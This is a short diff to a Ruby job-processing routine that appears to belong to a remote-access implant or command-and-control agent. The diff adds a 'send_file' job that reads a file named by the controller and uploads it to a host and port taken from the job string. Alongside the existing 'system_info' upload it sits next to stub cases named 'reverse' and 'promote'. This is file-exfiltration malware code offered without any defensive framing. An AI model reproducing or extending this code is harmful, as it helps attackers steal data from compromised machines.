@@ -15,11 +15,19 @@ def processjobs(job, key)
         case jobcmd
         when "system_info"
         	host = job.split(":")[4].strip
-		puts "Host is #{host}"
+		puts "Job host is #{host}"
         	port = job.split(":")[5].strip
-		puts "Port is #{port}"
+		puts "Job port is #{port}"
 		jobresult = system_info()
 		upload(host, port, key, jobresult, "system_info") 
+	when "send_file"
+		host = job.split(":")[4].strip
+		puts "Job host is #{host}"
+		port = job.split(":")[5].strip
+		puts "Job port is #{port}"
+		fileinfo = job.split(":")[6].strip
+		jobresult = pull_file(fileinfo) 
+		upload(host, port, key, jobresult, "send_file")
 	when "reverse"
         #       reverse(job)
         when "promote"
@@ -40,7 +48,7 @@ def sched_job(jobqueue, key)
 	        if !job.nil?
 	                scheduler.in '2s' do
 	                        puts "Executing job: #{job}"
-				puts processjobs(job, key)
+				processjobs(job, key)
 				puts "Job complete: #{job}"
 	                end
         end
